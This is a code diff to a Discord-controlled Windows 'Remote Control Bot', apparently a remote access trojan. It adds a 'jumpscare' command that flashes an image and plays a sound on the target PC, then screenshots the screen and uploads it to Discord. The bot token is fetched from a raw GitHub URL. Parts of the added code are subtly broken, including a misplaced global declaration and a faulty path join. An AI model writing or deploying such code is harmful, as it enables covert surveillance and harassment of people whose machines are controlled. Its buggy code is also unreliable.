@@ -32,6 +32,7 @@ from typing import Optional
 import win32com.client
 from pathlib import Path
 import socket as st1
+import winsound
 
 
 user_profile = os.environ['USERPROFILE']
@@ -734,6 +735,64 @@ async def browse(interaction: nextcord.Interaction):
         view = FileView(initial_path, [])
         await interaction.response.send_message("Browse files:", view=view)
 
+
+@client.slash_command(guild_ids=testServerId, description="Jumpscares the client.")
+async def jumpscare(interaction: nextcord.Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        user_id = interaction.user.id
+        if not user_id == 704040223121604709:
+            print("Jumpscare command received, but user is not allowed to use it")
+            await interaction.response.send_message("You are not allowed to use this command.")
+            return
+        print("Jumpscare command received")
+        print("Activating jumpscare...")
+        global jumpscaring
+        jumpscaring = True
+        n = 10
+        while not n == 0:
+            await interaction.response.send_message(f"Jumpscare activating in {n} seconds...")
+            time.sleep(1)
+            if not jumpscaring:
+                await interaction.edit_original_message(content="Jumpscare cancelled.")
+                print("Jumpscare cancelled")
+                return
+            n -= 1
+        print("Jumpscare activated")
+        await interaction.edit_original_message(content="Jumpscare activated!, sending jumpscare...")
+        img = cv2.imread(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'jumpscare' 'jumpscare.png'))
+        cv2.imshow("Jumpscare", img)
+        winsound.PlaySound(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'jumpscare' 'jumpscare.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)
+        print("Taking screenshot...")
+        await interaction.edit_original_message(content="Jumpscare activated!, taking screenshot...")
+
+        screenshot = pyautogui.screenshot()
+        x, y = pyautogui.position()
+        final_x = x - cursor_width // 2
+        final_y = y - cursor_height // 2
+        paste_position = (final_x, final_y)
+        screenshot.paste(cursor_image, paste_position, cursor_image)
+        screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
+        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
+        embed = nextcord.Embed(description="Jumpscare", title="Jumpscare image:", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_image(url=f"attachment://status.png")
+        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
+        time.sleep(1)
+
+        await interaction.send(embed=embed, file=file)
+        print("Screenshot sent")
+        cv2.destroyAllWindows()
+        
+
+        
+@client.event
+async def on_message(message):
+
+    if jumpscaring:
+        global jumpscaring
+        jumpscaring = False
 
 print("Getting token")
 r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
